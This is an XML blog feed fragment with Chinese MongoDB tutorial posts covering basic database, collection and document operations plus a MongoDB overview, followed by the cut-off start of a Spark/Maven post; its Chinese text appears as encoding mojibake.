class="line-numbers language-python"><code class="language-python">result <span class="token operator">=</span> user_coll<span class="token punctuation">.</span>update_one<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"nina"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                             <span class="token punctuation">{</span><span class="token string">"$set"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"phone"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨ï¼šæˆ‘ä»¬å¹¶æ²¡æœ‰å»æ•°æ®åº“ä¿®æ”¹è¡¨ç»“æ„</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBåŸºæœ¬æ“ä½œ</title>
      <link href="/post/2920ef5e.html"/>
      <url>/post/2920ef5e.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-åŸºæœ¬æ“ä½œ"><a href="#MongoDB-åŸºæœ¬æ“ä½œ" class="headerlink" title="MongoDB åŸºæœ¬æ“ä½œ"></a>MongoDB åŸºæœ¬æ“ä½œ</h1><h2 id="ä¸€ã€æ•°æ®åº“æ“ä½œ"><a href="#ä¸€ã€æ•°æ®åº“æ“ä½œ" class="headerlink" title="ä¸€ã€æ•°æ®åº“æ“ä½œ"></a>ä¸€ã€æ•°æ®åº“æ“ä½œ</h2><h3 id="åˆ›å»º-ä½¿ç”¨-use-åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»º-ä½¿ç”¨-use-åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»º - ä½¿ç”¨ use åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»º - ä½¿ç”¨ use åˆ›å»ºæ•°æ®åº“</h3><ul><li>ä½¿ç”¨ <strong>use DATABASE_NAME</strong> æ¥åˆ›å»ºæ•°æ®åº“</li><li>ç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">> use testswitched to db test> dbtest><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æŸ¥çœ‹-æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“"><a href="#æŸ¥çœ‹-æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“" class="headerlink" title="æŸ¥çœ‹ - æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“"></a>æŸ¥çœ‹ - æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</h3><ul><li>ä½¿ç”¨ <strong>show dbs</strong> å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</li></ul><h3 id="åˆ é™¤-ä½¿ç”¨-dropDatabase-åˆ é™¤æ•°æ®åº“"><a href="#åˆ é™¤-ä½¿ç”¨-dropDatabase-åˆ é™¤æ•°æ®åº“" class="headerlink" title="åˆ é™¤ - ä½¿ç”¨ dropDatabase åˆ é™¤æ•°æ®åº“"></a>åˆ é™¤ - ä½¿ç”¨ dropDatabase åˆ é™¤æ•°æ®åº“</h3><ul><li>ä½¿ç”¨ <strong>db.dropDatabase()</strong> æ¥åˆ é™¤æ•°æ®åº“</li><li>æ•°æ®ç›¸åº”æ–‡ä»¶ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œç£ç›˜ç©ºé—´è¢«é‡Šæ”¾</li></ul><h2 id="äºŒã€é›†åˆæ“ä½œ"><a href="#äºŒã€é›†åˆæ“ä½œ" class="headerlink" title="äºŒã€é›†åˆæ“ä½œ"></a>äºŒã€é›†åˆæ“ä½œ</h2><h3 id="åˆ›å»º-ä½¿ç”¨-createCollection-åˆ›å»ºé›†åˆ"><a href="#åˆ›å»º-ä½¿ç”¨-createCollection-åˆ›å»ºé›†åˆ" class="headerlink" title="åˆ›å»º - ä½¿ç”¨ createCollection åˆ›å»ºé›†åˆ"></a>åˆ›å»º - ä½¿ç”¨ createCollection åˆ›å»ºé›†åˆ</h3><ul><li>è¯­æ³•æ ¼å¼ï¼š<strong>db.createCollection(name, options)</strong></li><li>name: è¦åˆ›å»ºçš„é›†åˆåç§°</li><li>options: å¯é€‰å‚æ•°, æŒ‡å®šæœ‰å…³å†…å­˜å¤§å°åŠç´¢å¼•çš„é€‰é¡¹</li><li>options å¯ä»¥æ˜¯ä»¥ä¸‹å‚æ•°ï¼š<table><thead><tr><th><strong>å­—æ®µ</strong></th><th><strong>ç±»å‹</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>capped</td><td>å¸ƒå°”</td><td>ï¼ˆå¯é€‰ï¼‰å¦‚æœä¸º trueï¼Œåˆ™åˆ›å»ºå›ºå®šé›†åˆã€‚å›ºå®šé›†åˆæ˜¯æŒ‡æœ‰ç€å›ºå®šå¤§å°çš„é›†åˆï¼Œå½“è¾¾åˆ°æœ€å¤§å€¼æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è¦†ç›–æœ€æ—©çš„æ–‡æ¡£ã€‚å½“è¯¥å€¼ä¸º true æ—¶ï¼Œå¿…é¡»æŒ‡å®š size å‚æ•°ã€‚</td></tr><tr><td>autoIndexId</td><td>å¸ƒå°”</td><td>3.2 ä¹‹åä¸å†æ”¯æŒè¯¥å‚æ•°ã€‚ï¼ˆå¯é€‰ï¼‰å¦‚ä¸º trueï¼Œè‡ªåŠ¨åœ¨ _id å­—æ®µåˆ›å»ºç´¢å¼•ã€‚é»˜è®¤ä¸º falseã€‚</td></tr><tr><td>size</td><td>æ•°å€¼</td><td>ï¼ˆå¯é€‰ï¼‰ä¸ºå›ºå®šé›†åˆæŒ‡å®šä¸€ä¸ªæœ€å¤§å€¼ï¼Œå³å­—èŠ‚æ•°ã€‚å¦‚æœ capped ä¸º trueï¼Œä¹Ÿéœ€è¦æŒ‡å®šè¯¥å­—æ®µã€‚</td></tr><tr><td>max</td><td>æ•°å€¼</td><td>ï¼ˆå¯é€‰ï¼‰æŒ‡å®šå›ºå®šé›†åˆä¸­åŒ…å«æ–‡æ¡£çš„æœ€å¤§æ•°é‡ã€‚</td></tr></tbody></table></li></ul><h3 id="æŸ¥è¯¢-æŸ¥è¯¢æ•°æ®åº“ä¸­çš„é›†åˆ"><a href="#æŸ¥è¯¢-æŸ¥è¯¢æ•°æ®åº“ä¸­çš„é›†åˆ" class="headerlink" title="æŸ¥è¯¢ - æŸ¥è¯¢æ•°æ®åº“ä¸­çš„é›†åˆ"></a>æŸ¥è¯¢ - æŸ¥è¯¢æ•°æ®åº“ä¸­çš„é›†åˆ</h3><ul><li>æŸ¥è¯¢è¯­å¥ï¼š<strong>show collections / show tables</strong></li></ul><h3 id="é‡å‘½å-ä½¿ç”¨-renameCollection-é‡å‘½åé›†åˆ"><a href="#é‡å‘½å-ä½¿ç”¨-renameCollection-é‡å‘½åé›†åˆ" class="headerlink" title="é‡å‘½å - ä½¿ç”¨ renameCollection é‡å‘½åé›†åˆ"></a>é‡å‘½å - ä½¿ç”¨ renameCollection é‡å‘½åé›†åˆ</h3><ul><li>è¯­æ³•æ ¼å¼ï¼š<strong>db.COLLECTION_NAME.renameCollection(â€œNEW_NAMEâ€)</strong></li></ul><h3 id="åˆ é™¤-ä½¿ç”¨-drop-åˆ é™¤é›†åˆ"><a href="#åˆ é™¤-ä½¿ç”¨-drop-åˆ é™¤é›†åˆ" class="headerlink" title="åˆ é™¤ - ä½¿ç”¨ drop åˆ é™¤é›†åˆ"></a>åˆ é™¤ - ä½¿ç”¨ drop åˆ é™¤é›†åˆ</h3><ul><li>ä½¿ç”¨ **db.&lt;é›†åˆ&gt;.drop()**æ¥åˆ é™¤ä¸€ä¸ªé›†åˆ</li><li>é›†åˆä¸­çš„å…¨éƒ¨æ–‡æ¡£éƒ½ä¼šè¢«åˆ é™¤</li><li>é›†åˆç›¸å…³çš„ç´¢å¼•ä¹Ÿä¼šè¢«åˆ é™¤</li><li>ç¤ºä¾‹ï¼šdb.colToBeDropped.drop()</li></ul><h2 id="ä¸‰ã€æ–‡æ¡£æ“ä½œ"><a href="#ä¸‰ã€æ–‡æ¡£æ“ä½œ" class="headerlink" title="ä¸‰ã€æ–‡æ¡£æ“ä½œ"></a>ä¸‰ã€æ–‡æ¡£æ“ä½œ</h2><h3 id="æ’å…¥-ä½¿ç”¨-insert-å®Œæˆæ’å…¥æ“ä½œ"><a href="#æ’å…¥-ä½¿ç”¨-insert-å®Œæˆæ’å…¥æ“ä½œ" class="headerlink" title="æ’å…¥ - ä½¿ç”¨ insert å®Œæˆæ’å…¥æ“ä½œ"></a>æ’å…¥ - ä½¿ç”¨ insert å®Œæˆæ’å…¥æ“ä½œ</h3><p>æ“ä½œæ ¼å¼ï¼š</p><ul><li>db.<strong>&lt;é›†åˆ&gt;</strong>.insertOne(<strong>&lt;JSON å¯¹è±¡&gt;</strong>)</li><li>db.<strong>&lt;é›†åˆ&gt;</strong>.insertMany([<strong>&lt;JSON 1&gt;, &lt;JSON 2&gt;, &lt;JSON 3&gt;, â€¦, <json n=""></json></strong>])</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-plsql"><code class="language-plsql">db.fruit.insertOne({name: "apple"})db.fruit.insertMany([    {name: "apple"},  {name: "pear"},  {name: "orange"}])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æŸ¥è¯¢-ä½¿ç”¨-find-æŸ¥è¯¢æ–‡æ¡£"><a href="#æŸ¥è¯¢-ä½¿ç”¨-find-æŸ¥è¯¢æ–‡æ¡£" class="headerlink" title="æŸ¥è¯¢ - ä½¿ç”¨ find æŸ¥è¯¢æ–‡æ¡£"></a>æŸ¥è¯¢ - ä½¿ç”¨ find æŸ¥è¯¢æ–‡æ¡£</h3><ul><li>å…³äº findï¼š<ul><li>find æ˜¯ MongoDB ä¸­æŸ¥è¯¢æ•°æ®çš„åŸºæœ¬æŒ‡ä»¤ï¼Œç›¸å½“äº SQL ä¸­çš„ SELECTã€‚</li><li>find è¿”å›çš„æ˜¯æ¸¸æ ‡</li></ul></li><li>find ç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.movies.find({"year": 1975}) // å•æ¡ä»¶æŸ¥è¯¢db.movies.find({"year": 1989, "title": "Batman"}) // å¤šæ¡ä»¶andæŸ¥è¯¢db.movies.find({$and: [{"title": "Batman"}, {"category": "action"}]})  // andçš„å¦ä¸€ç§å½¢å¼db.movies.find({$or: [{"year": 1989}, {"title": "Beaman"}]}) // å¤šæ¡ä»¶oræŸ¥è¯¢db.movies.find({"title": /^B/}}) // æŒ‰æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>æŸ¥è¯¢æ¡ä»¶å¯¹ç…§è¡¨</p><table><thead><tr><th><strong>SQL</strong></th><th><strong>MQL</strong></th></tr></thead><tbody><tr><td>a = 1</td><td>{a: 1}</td></tr><tr><td>a &lt;&gt; 1</td><td>{a: {$ne: 1}}</td></tr><tr><td>a &gt; 1</td><td>{a: {$gt: 1}}</td></tr><tr><td>a &gt;= 1</td><td>{a: {$gte: 1}}</td></tr><tr><td>a &lt; 1</td><td>{a: {$lt: 1}}</td></tr><tr><td>a &lt;= 1</td><td>{a: {$lte: 1}}</td></tr><tr><td>a = 1 AND b = 1</td><td>{a: 1, b: 1}æˆ–{$and: [{a: 1}, {b: 1}]}</td></tr><tr><td>a = 1 OR b = 1</td><td>{$or: [{a: 1}, {b: 1}]}</td></tr><tr><td>a IS NULL</td><td>{a: {$exists: false}}</td></tr><tr><td>a IN (1, 2, 3)</td><td>{a: {$in: [1, 2, 3]}}</td></tr></tbody></table></li><li><p>æŸ¥è¯¢é€»è¾‘è¿ç®—ç¬¦</p><ul><li>$ltï¼šå­˜åœ¨å¹¶å°äº</li><li>$lteï¼šå­˜åœ¨å¹¶å°äºç­‰äº</li><li>$gtï¼šå­˜åœ¨å¹¶å¤§äº</li><li>$gteï¼šå­˜åœ¨å¹¶å°äºç­‰äº</li><li>$neï¼šä¸å­˜åœ¨æˆ–å­˜åœ¨ä½†ä¸ç­‰äº</li><li>$inï¼šå­˜åœ¨å¹¶åœ¨æŒ‡å®šæ•°ç»„ä¸­</li><li>$ninï¼šä¸å­˜åœ¨æˆ–ä¸åœ¨æŒ‡å®šæ•°ç»„ä¸­</li><li>$orï¼šåŒ¹é…ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶ä¸­çš„ä¸€ä¸ª</li><li>$andï¼šåŒ¹é…å…¨éƒ¨æ¡ä»¶</li></ul></li><li><p>ä½¿ç”¨ find æœç´¢å­æ–‡æ¡£</p><ul><li>db.fruit.find({â€œfrom.countryâ€: â€œChinaâ€}) // âœ”ï¸ æ­£ç¡®</li><li>db.fruit.find({â€œfromâ€: {country: â€œChinaâ€}}) // â é”™è¯¯</li></ul></li><li><p>æ§åˆ¶ find è¿”å›çš„å­—æ®µ</p><ul><li>find å¯ä»¥æŒ‡å®šåªè¿”å›æŒ‡å®šçš„å­—æ®µ</li><li>_id å­—æ®µå¿…é¡»æ˜ç¡®æŒ‡æ˜ä¸è¿”å›ï¼Œå¦åˆ™é»˜è®¤è¿”å›</li><li>åœ¨ MongoDB ä¸­æˆ‘ä»¬ç§°è¿™ä¸ºæŠ•å½±ï¼ˆprojectionï¼‰</li><li><strong>db.movies.find({â€œcategoryâ€: â€œactionâ€}, {â€œ_idâ€, 0, title: 1})</strong> // ä¸è¿”å›_idï¼Œè¿”å› title</li></ul></li></ul><h3 id="åˆ é™¤-ä½¿ç”¨-remove-åˆ é™¤æ–‡æ¡£"><a href="#åˆ é™¤-ä½¿ç”¨-remove-åˆ é™¤æ–‡æ¡£" class="headerlink" title="åˆ é™¤ - ä½¿ç”¨ remove åˆ é™¤æ–‡æ¡£"></a>åˆ é™¤ - ä½¿ç”¨ remove åˆ é™¤æ–‡æ¡£</h3><ul><li>remove å‘½ä»¤éœ€è¦é…åˆæŸ¥è¯¢æ¡ä»¶ä½¿ç”¨</li><li>åŒ¹é…æŸ¥è¯¢æ¡ä»¶çš„æ–‡æ¡£ä¼šè¢«åˆ é™¤</li><li>æŒ‡å®šä¸€ä¸ªç©ºæ¡ä»¶ä¼šåˆ é™¤æ‰€æœ‰æ–‡æ¡£</li><li>ç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.testcol.remove({a: 1}) // åˆ é™¤aç­‰äº1çš„è®°å½•db.testcol.remove({a: {$lt: 5}}) // åˆ é™¤aå°äº5çš„è®°å½•db.testcol.remove({}) // åˆ é™¤æ‰€æœ‰è®°å½•db.testcol.remove() // æŠ¥é”™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ›´æ–°-ä½¿ç”¨-update-æ›´æ–°æ–‡æ¡£"><a href="#æ›´æ–°-ä½¿ç”¨-update-æ›´æ–°æ–‡æ¡£" class="headerlink" title="æ›´æ–° - ä½¿ç”¨ update æ›´æ–°æ–‡æ¡£"></a>æ›´æ–° - ä½¿ç”¨ update æ›´æ–°æ–‡æ¡£</h3><ul><li>Update æ“ä½œæ‰§è¡Œæ ¼å¼ï¼š<strong>db.&lt;é›†åˆ&gt;.update(&lt;æŸ¥è¯¢æ¡ä»¶&gt;, &lt;æ›´æ–°å­—æ®µ&gt;)</strong></li><li>ç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">// æŸ¥è¯¢ name ä¸º appleçš„è®°å½•ï¼Œå¹¶å°†æ‰¾åˆ°è®°å½•çš„ from è®¾ç½®ä¸º Chinadb.fruit.updateOne({name: "apple"}, {$set: {from: "China"}})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ä½¿ç”¨ updateOne è¡¨ç¤ºæ— è®ºæ¡ä»¶åŒ¹é…å¤šå°‘æ¡è®°å½•ï¼Œé»˜è®¤æ›´æ–°ç¬¬ä¸€æ¡</li><li>ä½¿ç”¨ updateMany è¡¨ç¤ºæ¡ä»¶åŒ¹é…å¤šå°‘æ¡å°±æ›´æ–°å¤šå°‘æ¡</li><li>updateOne/updateMany æ–¹æ³•è¦æ±‚æ›´æ–°æ¡ä»¶éƒ¨åˆ†å¿…é¡»å…·æœ‰ä»¥ä¸‹æ¡ä»¶ä¹‹ä¸€ï¼Œå¦åˆ™å°†æŠ¥é”™ï¼š<ul><li>$set/$unset</li><li>$push/pushAll/$pop</li><li>$pull/$pullAll</li><li>$addToSet</li></ul></li><li>æ“ä½œæ¡ä»¶<table><thead><tr><th><strong>æ“ä½œæ¡ä»¶</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>$push</td><td>å¢åŠ ä¸€ä¸ªå¯¹è±¡åˆ°æ•°ç»„åº•éƒ¨</td></tr><tr><td>$pushAll</td><td>å¢åŠ å¤šä¸ªå¯¹è±¡åˆ°æ•°ç»„åº•éƒ¨</td></tr><tr><td>$pop</td><td>ä»æ•°ç»„åº•éƒ¨åˆ é™¤ä¸€ä¸ªå¯¹è±¡</td></tr><tr><td>$pull</td><td>å¦‚æœåŒ¹é…æŒ‡å®šçš„å€¼ï¼Œä»æ•°ç»„ä¸­ç›¸åº”çš„å¯¹è±¡</td></tr><tr><td>$pullAll</td><td>å¦‚æœåŒ¹é…ä»»æ„çš„å€¼ï¼Œä»æ•°ç»„ä¸­ç›¸åº”çš„å¯¹è±¡</td></tr><tr><td>$addToSet</td><td>å¦‚æœä¸å­˜åœ¨åˆ™å¢åŠ ä¸€ä¸ªå€¼åˆ°æ•°ç»„</td></tr></tbody></table></li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºMongoDB</title>
      <link href="/post/34fcf34a.html"/>
      <url>/post/34fcf34a.html</url>
      
        <content type="html"><![CDATA[<h1 id="å…³äº-MongoDB"><a href="#å…³äº-MongoDB" class="headerlink" title="å…³äº MongoDB"></a>å…³äº MongoDB</h1><h2 id="ä¸€ã€åŸºæœ¬é—®é¢˜"><a href="#ä¸€ã€åŸºæœ¬é—®é¢˜" class="headerlink" title="ä¸€ã€åŸºæœ¬é—®é¢˜"></a>ä¸€ã€åŸºæœ¬é—®é¢˜</h2><table><thead><tr><th><strong>é—®é¢˜</strong></th><th><strong>è§£ç­”</strong></th></tr></thead><tbody><tr><td>ä»€ä¹ˆæ˜¯ MongoDBï¼Ÿ</td><td>ä¸€ä¸ªä»¥ JSON ä¸ºæ•°æ®æ¨¡å‹çš„æ–‡æ¡£æ•°æ®åº“</td></tr><tr><td>ä¸ºä»€ä¹ˆå«æ–‡æ¡£æ•°æ®åº“ï¼Ÿ</td><td>æ–‡æ¡£æ¥è‡ªäºâ€œJSON documentâ€ï¼Œå¹¶éæˆ‘ä»¬ä¸€èˆ¬ç†è§£çš„ PDFã€Word æ–‡æ¡£</td></tr><tr><td>è°å¼€å‘ MongoDBï¼Ÿ</td><td>ä¸Šå¸‚å…¬å¸ MongoDB Inc.ï¼Œæ€»éƒ¨ä½äºç¾å›½çº½çº¦ã€‚</td></tr><tr><td>ä¸»è¦ç”¨é€”</td><td>åº”ç”¨æ•°æ®åº“ï¼Œç±»ä¼¼äº Oracleã€MySQL</td></tr><tr><td>æµ·é‡æ•°æ®å¤„ç†ï¼Œæ•°æ®å¹³å°</td><td></td></tr><tr><td>ä¸»è¦ç‰¹ç‚¹</td><td>å»ºæ¨¡ä¸ºå¯é€‰</td></tr></tbody></table><p>JSON æ•°æ®æ¨¡å‹æ¯”è¾ƒé€‚åˆå¼€å‘è€…<br>æ¨ªå‘æ‰©å±•å¯ä»¥æ”¯æ’‘å¾ˆå¤§æ•°æ®é‡å’Œå¹¶å‘ |<br>| MongoDB æ˜¯å…è´¹çš„å—ï¼Ÿ | MongoDB æœ‰ä¸¤ä¸ªå‘å¸ƒç‰ˆæœ¬ï¼šç¤¾åŒºç‰ˆå’Œä¼ä¸šç‰ˆã€‚<br>ç¤¾åŒºç‰ˆæ˜¯åŸºäº SSPLï¼Œä¸€ç§å’Œ AGPL åŸºæœ¬ç±»ä¼¼çš„å¼€æºåè®®<br>ä¼ä¸šç‰ˆæ˜¯åŸºäºå•†ä¸šåè®®ï¼Œéœ€ä»˜è´¹ä½¿ç”¨ |</p><h2 id="äºŒã€ç‰ˆæœ¬å˜è¿"><a href="#äºŒã€ç‰ˆæœ¬å˜è¿" class="headerlink" title="äºŒã€ç‰ˆæœ¬å˜è¿"></a>äºŒã€ç‰ˆæœ¬å˜è¿</h2><p>0.xï¼šèµ·æ­¥é˜¶æ®µï¼ˆ2008ï¼‰<br>1.xï¼šæ”¯æŒå¤åˆ¶é›†å’Œåˆ†ç‰‡é›†ï¼ˆ2010ï¼‰<br>2.xï¼šæ›´ä¸°å¯Œçš„æ•°æ®åº“åŠŸèƒ½ï¼ˆ2012ï¼‰<br>3.xï¼šWiredTiger å’Œå‘¨è¾¹ç”Ÿæ€ç¯å¢ƒï¼ˆ2014ï¼‰<br>4.xï¼šåˆ†å¸ƒå¼äº‹åŠ¡æ”¯æŒï¼ˆ2018ï¼‰</p><h2 id="ä¸‰ã€MongoDB-vs-å…³ç³»å‹æ•°æ®åº“"><a href="#ä¸‰ã€MongoDB-vs-å…³ç³»å‹æ•°æ®åº“" class="headerlink" title="ä¸‰ã€MongoDB vs å…³ç³»å‹æ•°æ®åº“"></a>ä¸‰ã€MongoDB vs å…³ç³»å‹æ•°æ®åº“</h2><table><thead><tr><th><strong>-</strong></th><th><strong>MongoDB</strong></th><th><strong>RDBMS</strong></th></tr></thead><tbody><tr><td>æ•°æ®æ¨¡å‹</td><td>æ–‡æ¡£æ¨¡å‹</td><td>å…³ç³»æ¨¡å‹</td></tr><tr><td>æ•°æ®åº“ç±»å‹</td><td>OLTP</td><td>OLTP</td></tr><tr><td>CRUD æ“ä½œ</td><td>MQL/SQL</td><td>SQL</td></tr><tr><td>é«˜å¯ç”¨</td><td>å¤åˆ¶é›†</td><td>é›†ç¾¤æ¨¡å¼</td></tr><tr><td>æ¨ªå‘æ‰©å±•èƒ½åŠ›</td><td>é€šè¿‡åŸç”Ÿåˆ†ç‰‡å®Œå–„æ”¯æŒ</td><td>æ•°æ®åˆ†åŒºæˆ–è€…åº”ç”¨ä¾µå…¥å¼</td></tr><tr><td>ç´¢å¼•æ”¯æŒ</td><td>B-æ ‘ã€å…¨æ–‡ç´¢å¼•ã€åœ°ç†ä½ç½®ç´¢å¼•ã€å¤šé”®(multikey)ç´¢å¼•ã€TTL ç´¢å¼•</td><td>B-æ ‘</td></tr><tr><td>å¼€å‘éš¾åº¦</td><td>å®¹æ˜“</td><td>å›°éš¾</td></tr><tr><td>æ•°æ®å®¹é‡</td><td>æ²¡æœ‰ç†è®ºä¸Šé™</td><td>åƒä¸‡ã€äº¿</td></tr><tr><td>æ‰©å±•æ–¹å¼</td><td>å‚ç›´æ‰©å±•+æ°´å¹³æ‰©å±•</td><td>å‚ç›´æ‰©å±•</td></tr></tbody></table><h2 id="MongoDB-ä¼˜åŠ¿"><a href="#MongoDB-ä¼˜åŠ¿" class="headerlink" title="MongoDB ä¼˜åŠ¿"></a>MongoDB ä¼˜åŠ¿</h2><h3 id="ä¼˜åŠ¿æ¦‚è¿°"><a href="#ä¼˜åŠ¿æ¦‚è¿°" class="headerlink" title="ä¼˜åŠ¿æ¦‚è¿°"></a>ä¼˜åŠ¿æ¦‚è¿°</h3><p>é¢å‘å¼€å‘è€…çš„æ˜“ç”¨+é«˜æ•ˆæ•°æ®åº“</p><h4 id="1-ç®€å•ç›´è§‚"><a href="#1-ç®€å•ç›´è§‚" class="headerlink" title="1. ç®€å•ç›´è§‚"></a>1. ç®€å•ç›´è§‚</h4><p>ä»¥è‡ªç„¶çš„æ–¹å¼æ‹‰å»ºæ¨¡ï¼Œä»¥ç›´è§‚çš„æ–¹å¼æ¥ä¸æ•°æ®åº“äº¤äº’</p><h4 id="2-ç»“æ„çµæ´»"><a href="#2-ç»“æ„çµæ´»" class="headerlink" title="2. ç»“æ„çµæ´»"></a>2. ç»“æ„çµæ´»</h4><p>å¼¹æ€§æ¨¡å¼ä»å®¹å“åº”éœ€æ±‚çš„é¢‘ç¹å˜åŒ–</p><h4 id="3-å¿«é€Ÿå¼€å‘"><a href="#3-å¿«é€Ÿå¼€å‘" class="headerlink" title="3. å¿«é€Ÿå¼€å‘"></a>3. å¿«é€Ÿå¼€å‘</h4><p>åšæ›´å¤šçš„äº‹ï¼Œå†™æ›´å°‘çš„ä»£ç </p><h3 id="å¯¹è±¡æ¨¡å‹"><a href="#å¯¹è±¡æ¨¡å‹" class="headerlink" title="å¯¹è±¡æ¨¡å‹"></a>å¯¹è±¡æ¨¡å‹</h3><h3 id="çµæ´»ï¼šå¿«é€Ÿå“åº”ä¸šåŠ¡å˜åŒ–"><a href="#çµæ´»ï¼šå¿«é€Ÿå“åº”ä¸šåŠ¡å˜åŒ–" class="headerlink" title="çµæ´»ï¼šå¿«é€Ÿå“åº”ä¸šåŠ¡å˜åŒ–"></a>çµæ´»ï¼šå¿«é€Ÿå“åº”ä¸šåŠ¡å˜åŒ–</h3><p>å¯åŠ¨æ€æ·»åŠ æ–°å­—æ®µ</p><ul><li>å¤šå½¢æ€§ï¼šåŒä¸€ä¸ªé›†åˆä¸­å¯ä»¥åŒ…å«ä¸åŒå­—æ®µï¼ˆç±»å‹ï¼‰çš„æ–‡æ¡£å¯¹è±¡</li><li>åŠ¨æ€æ€§ï¼šçº¿ä¸Šä¿®æ”¹æ•°æ®æ¨¡å¼ï¼Œä¿®æ”¹æ˜¯åº”ç”¨ä¸æ•°æ®åº“å‡æ— éœ€ä¸‹çº¿</li><li>æ•°æ®æ²»ç†ï¼šæ”¯æŒä½¿ç”¨ JSON Schema æ¥è§„èŒƒæ•°æ®æ¨¡å¼ã€‚åœ¨ä¿è¯æ¨¡å¼çµæ´»åŠ¨æ€çš„å‰æä¸‹ï¼Œæä¾›æ•°æ®æ²»ç†èƒ½åŠ›</li></ul><h2 id="å¿«é€Ÿï¼šæœ€ç®€å•å¿«é€Ÿçš„å¼€å‘æ–¹å¼"><a href="#å¿«é€Ÿï¼šæœ€ç®€å•å¿«é€Ÿçš„å¼€å‘æ–¹å¼" class="headerlink" title="å¿«é€Ÿï¼šæœ€ç®€å•å¿«é€Ÿçš„å¼€å‘æ–¹å¼"></a>å¿«é€Ÿï¼šæœ€ç®€å•å¿«é€Ÿçš„å¼€å‘æ–¹å¼</h2><ul><li>JSON æ¨¡å‹ä¹‹å¿«é€Ÿç‰¹æ€§ï¼š<ul><li>æ•°æ®åº“å¼•æ“åªéœ€è¦åœ¨ä¸€ä¸ªå­˜å‚¨åŒºè¯»å†™</li><li>åèŒƒå¼ã€æ— å…³è”çš„ç»„ç»‡æå¤§ä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦</li><li>ç¨‹åº API è‡ªç„¶ï¼Œå¼€å‘å¿«é€Ÿ</li></ul></li></ul><h3 id="åŸç”Ÿçš„é«˜å¯ç”¨"><a href="#åŸç”Ÿçš„é«˜å¯ç”¨" class="headerlink" title="åŸç”Ÿçš„é«˜å¯ç”¨"></a>åŸç”Ÿçš„é«˜å¯ç”¨</h3><ul><li>Replica Set - 2 to 50 ä¸ª</li><li>è‡ªæ¢å¤</li><li>å¤šä¸­å¿ƒå®¹ç¾èƒ½åŠ›</li><li>æ»šåŠ¨æœåŠ¡ - æœ€å°åŒ–æœåŠ¡ç»ˆç«¯</li></ul><h3 id="æ¨ªå‘æ‰©å±•èƒ½åŠ›"><a href="#æ¨ªå‘æ‰©å±•èƒ½åŠ›" class="headerlink" title="æ¨ªå‘æ‰©å±•èƒ½åŠ›"></a>æ¨ªå‘æ‰©å±•èƒ½åŠ›</h3><ul><li>éœ€è¦çš„æ—¶å€™æ— ç¼æ‰©å±•</li><li>åº”ç”¨å…¨é€æ˜</li><li>å¤šç§æ•°æ®åˆ†å¸ƒç­–ç•¥</li><li>è½»æ¾æ”¯æŒ TB - PB æ•°é‡çº§</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA+Mavenå¼€å‘Sparkåº”ç”¨</title>
      <link href="/post/1ec6df48.html"/>
      <url>/post/1ec6df48.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€åˆ›å»º-Maven-é¡¹ç›®"><a href="#ä¸€ã€åˆ›å»º-Maven-é¡¹ç›®" class="headerlink" title="ä¸€ã€åˆ›å»º Maven é¡¹ç›®"></a>ä¸€ã€åˆ›å»º Maven é¡¹ç›®</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617890879763-d282d8de-7645-4379-b637-bd6184718bd6.png#height=448&amp;id=wLC8j&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=896&amp;originWidth=1141&amp;originalType=binary%E2%88%B6=1&amp;size=122925&amp;status=done&amp;style=none&amp;width=570.5" alt="image.png"><br><img 